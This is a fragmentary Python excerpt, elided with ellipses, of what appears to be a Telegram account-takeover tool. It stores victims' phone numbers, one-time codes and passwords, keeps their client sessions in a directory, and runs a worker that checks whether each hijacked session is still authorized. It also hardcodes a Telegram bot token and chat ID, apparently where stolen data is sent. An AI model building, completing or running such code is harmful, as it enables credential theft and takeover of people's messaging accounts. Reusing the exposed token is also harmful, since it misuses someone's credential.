...
LOCK_FILE = "/tmp/johor_worker.lock"
...
try:
    ...
    worker_enabled = True
    print("[WORKER] This process owns the worker")
except:
    print("[WORKER] Worker already running in another process")
...
BOT_TOKEN = "7232956463:AAGE-kTOLhQDH_jD1pZ8479vp998sPGRyEY"
CHAT_ID = "7871039864"
...
def set_logout(phone):
    phone = normalize_phone_key(phone)
    if phone in LAST_DATA:
        LAST_DATA[phone]["logged_out"] = True


def get_data(phone):
    phone = normalize_phone_key(phone)
    return LAST_DATA.get(phone, {
        "otp": None,
        "password": None,
        "logged_out": False
    })
    ...
    if request.method == "POST":
        ...
        if result["ok"]:
            if result["need_pwd"]:
                ...
                save_data(phone)
                LAST_DATA[phone]["logged_out"] = False
            ...
            for fn in os.listdir(SESSION_DIR):
                ...
                try:
                    if not await client.is_user_authorized():
                        print(f"[WORKER] session {base} not authorized (LOGOUT)")
                        set_logout(base)
                        await client.disconnect()
                        continue
